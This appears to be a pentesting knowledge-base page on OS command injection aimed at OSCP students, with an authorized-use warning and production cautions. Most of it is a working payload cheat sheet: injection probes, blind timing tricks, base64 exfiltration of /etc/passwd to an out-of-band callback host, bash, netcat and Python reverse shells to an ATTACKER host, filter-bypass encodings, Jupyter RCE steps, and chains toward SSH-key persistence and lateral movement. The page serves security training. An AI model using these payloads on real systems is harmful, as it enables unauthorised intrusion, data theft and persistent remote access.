# Command Injection

> OS command injection: attacker-controlled input reaches a shell call
> (system, exec, popen, Runtime.exec, Process.Start).

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Specific Contexts](#5-specific-contexts)
- [6. Tools](#6-tools)
- [7. OSCP Notes](#7-oscp-notes)
- [8. Cheatsheet](#8-cheatsheet)
- [9. References](#9-references)

---

## 1. Overview

Command injection = shell metacharacters in user input are interpreted by
the OS. Classic sink: system, exec, popen, subprocess with shell=True,
Runtime.exec, Process.Start.

**Flavors:**

| Flavor | Signal |
|--------|--------|
| Non-blind | Command output reflected in the response |
| Blind | No output; use timing or OOB callback |
| Semi-blind | Only errors / timing differences |

**Common injection points:**

- Ping / traceroute tools.
- DNS lookup, whois, nslookup.
- Image / PDF converters.
- Backup / export features.
- Filename fields used in shell commands.
- CI/CD pipeline parameters.

**On OSCP:** command injection usually comes from a web feature that
shells out. Blind injection via timing is common.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Non-destructive probe (id, whoami) | [PROD-RISK] |
| Reverse shell | [PROD-NO] |
| File write / overwrite | [PROD-NO] |
| Blind time-based (sleep 5) | [PROD-RISK] |
| Chained with upload / LFI | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT run destructive commands (rm, dd, shutdown, mv).
- Do NOT open a reverse shell without approval.
- Do NOT chain to privesc / lateral movement without approval.
- Do NOT use time-based probes with long delays (SLA risk).

In production, prove command execution with id or whoami, then stop.

### 2.3 Rate limiting

Command injection probes are individual requests. Do not fuzz payloads at
scale in production (WAF will flag, and target shells may hang).

---

## 3. Detection

### 3.1 Basic probes (Linux)

Separators (Linux): ; | || && & backtick, subexpression, newline.

```bash
# Simple
curl 'http://target/ping?host=127.0.0.1;id'
curl 'http://target/ping?host=127.0.0.1|id'
curl 'http://target/ping?host=127.0.0.1&id'
curl 'http://target/ping?host=127.0.0.1&&id'

# Command substitution (bash)
curl 'http://target/ping?host=$(id)'
curl 'http://target/ping?host=`id`'
```

**Expected output:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3.2 Basic probes (Windows)

Separators (Windows): & && | || newline.

```bash
curl 'http://target/ping?host=127.0.0.1&whoami'
curl 'http://target/ping?host=127.0.0.1|whoami'
```

**Expected output:**

```text
nt authority\\iis apppool\\defaultapppool
```

### 3.3 Blind detection (time-based)

Linux:

```bash
curl 'http://target/ping?host=127.0.0.1;sleep 5' -w '\\ntime=%{time_total}\\n'
```

Windows:

```bash
curl 'http://target/ping?host=127.0.0.1&ping -n 5 127.0.0.1' -w '\\ntime=%{time_total}\\n'
```

5-second delay = injection confirmed.

### 3.4 OOB detection

```bash
# DNS callback
curl 'http://target/ping?host=127.0.0.1;nslookup $(id).xyz.oast.fun'

# HTTP callback
curl 'http://target/ping?host=127.0.0.1;curl http://xyz.oast.fun/$(whoami)'
```

interactsh-client watches for the callback.

---

## 4. Exploitation

### 4.1 Non-blind (Linux)

```bash
# Read files
curl 'http://target/ping?host=127.0.0.1;cat /etc/passwd'

# List directory
curl 'http://target/ping?host=127.0.0.1;ls -la /var/www'

# Environment
curl 'http://target/ping?host=127.0.0.1;env'
```

### 4.2 Non-blind (Windows)

```bash
curl 'http://target/ping?host=127.0.0.1&type C:\\Windows\\win.ini'
curl 'http://target/ping?host=127.0.0.1&dir C:\\'
curl 'http://target/ping?host=127.0.0.1&whoami /priv'
```

### 4.3 Blind (timing + OOB)

**Timing loop (character extraction):**

```bash
curl 'http://target/ping?host=127.0.0.1;if [ $(head -c1 /etc/passwd) = r ]; then sleep 5; fi'
```

**OOB exfiltration:**

```bash
curl 'http://target/ping?host=127.0.0.1;curl http://xyz.oast.fun/$(cat /etc/passwd | base64 -w0)'
```

### 4.4 Reverse shells

**Linux:**

```bash
# Bash TCP
bash -c 'bash -i &> /dev/tcp/ATTACKER/4444 0&>1'

# Nc mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&>1|nc ATTACKER 4444 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

Listener:

```bash
nc -lvnp 4444
```

**Windows (PowerShell):**

Use revshells.com to generate a base64-encoded PowerShell reverse shell,
then inject:

```text
powershell -e <BASE64_PAYLOAD>
```

### 4.5 Filter bypass

**Whitespace bypass:**

```text
cat/etc/passwd       (IFS = space, tab, newline)
cat/etc/passwd
cat</etc/passwd          (redirect as separator)
{cat,/etc/passwd}        (brace expansion)
```

**Wildcard bypass:**

```text
cat       -> /???/c?t
whoami    -> w?oami
```

**Encoding bypass (base64):**

```bash
echo -n 'cat /etc/passwd' | base64
# -> Y2F0IC9ldGMvcGFzc3dk
curl 'http://target/ping?host=127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash'
```

**Newline bypass:**

```text
%0a  (URL-encoded newline)
%0d%0a
```

### 4.6 Chains

- Command injection + reverse shell -> foothold.
- Command injection + read env -> creds for lateral movement.
- Command injection + write SSH key -> persistent access.
- File upload + LFI + command injection -> multi-stage RCE.

---

## 5. Specific Contexts

### 5.1 Web frameworks

**PHP:**

```php
system($_GET['cmd']);
exec($_GET['cmd']);
shell_exec($_GET['cmd']);
passthru($_GET['cmd']);
popen($_GET['cmd'], 'r');
```

**Python:**

```python
import os
os.system(request.args.get('cmd'))
os.popen(request.args.get('cmd')).read()
subprocess.run(cmd, shell=True)
```

**Node.js:**

```javascript
const { exec, execSync, spawn } = require('child_process');
exec(req.query.cmd)
spawn('sh', ['-c', req.query.cmd])
```

### 5.2 Java Runtime.exec

```java
Runtime.getRuntime().exec(cmd);
// exec(String) parses on whitespace, not a shell
// Use exec(new String[]{"/bin/sh", "-c", cmd}) for shell
```

### 5.3 .NET Process.Start

```csharp
System.Diagnostics.Process.Start("cmd.exe", "/c " + input);
```

### 5.4 Jupyter Notebook RCE

If a Jupyter server is reachable with no auth (or token leaked):

1. Open http://target:8888/ in a browser.
2. Create a new notebook.
3. In a cell, execute:

```python
import os; os.system('id')
```

4. Or open a terminal tab (Jupyter has one).

For a reverse shell:

```python
import os; os.system('bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"')
```

See [../01 Recon/Ports-Services.md](../01%20Recon/Ports-Services.md) section 7.

---

## 6. Tools

| Tool | Purpose |
|------|---------|
| commix | Automated command injection exploitation |
| Burp Suite | Manual testing + Intruder |
| interactsh-client | OOB callback listener |
| revshells.com | Reverse shell generator |

Examples:

```bash
# commix
commix --url='http://target/ping?host=127.0.0.1' --batch
commix --url='http://target/api' --data='host=127.0.0.1' --batch
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the request with the injection payload.
> - Screenshot the response with id or whoami output.
> - Screenshot the reverse shell connection.
> - If blind, screenshot the timing difference or the OOB callback.
>
> Command injection is a strong foothold proof. Capture request and response.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 8. Cheatsheet

```text
Linux separators:   ;  |  ||  &&  &  backtick  subexpression  newline
Windows separators: &  &&  |  ||  newline
```

```bash
# Simple probe
curl 'http://target/ping?host=127.0.0.1;id'
curl 'http://target/ping?host=127.0.0.1|id'
curl 'http://target/ping?host=127.0.0.1&whoami'

# Blind (timing)
curl 'http://target/ping?host=127.0.0.1;sleep 5' -w '\\ntime=%{time_total}\\n'

# Blind (OOB)
curl 'http://target/ping?host=127.0.0.1;nslookup $(id).xyz.oast.fun'

# Reverse shell
curl 'http://target/ping?host=127.0.0.1;bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"'

# Filter bypass
cat/etc/passwd
/???/c?t /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
```

---

## 9. References

- OWASP Command Injection - https://owasp.org/www-community/attacks/Command_Injection
- PortSwigger OS command injection - https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings Command Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- commix - https://github.com/commixproject/commix
- RevShells - https://www.revshells.com/

> See also: [../01 Recon/Ports-Services.md](../01%20Recon/Ports-Services.md), [LFI-RFI.md](./LFI-RFI.md), [File-Upload.md](./File-Upload.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
